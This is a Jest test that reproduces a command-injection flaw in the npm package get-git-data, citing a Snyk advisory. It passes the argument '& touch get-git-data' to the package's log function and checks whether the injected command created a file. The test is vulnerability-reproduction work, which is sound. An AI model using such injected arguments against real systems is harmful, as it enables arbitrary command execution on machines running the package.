//https://security.snyk.io/vuln/SNYK-JS-GETGITDATA-564222
test("Command Injection in get-git-data", async () => {
  expect.assertions(2);
  const root = require("get-git-data");
  const fs = require("fs");
  const path = "./get-git-data";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    // return root.log('& touch get-git-data').then(()=>{
    //     console.log("in then");
    //     }).catch(err=>{
    //         console.log(err);
    //     }).finally(()=>{
    //         console.log("here!");
    //         file_exist = fs.existsSync(path);
    //         expect(file_exist).toBe(true);
    //         fs.unlink(path, function (err) {
    //         });
    // });
    await root.log("& touch get-git-data");
  } catch (err) {
    console.log(err);
  } finally {
    console.log("finally!");
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
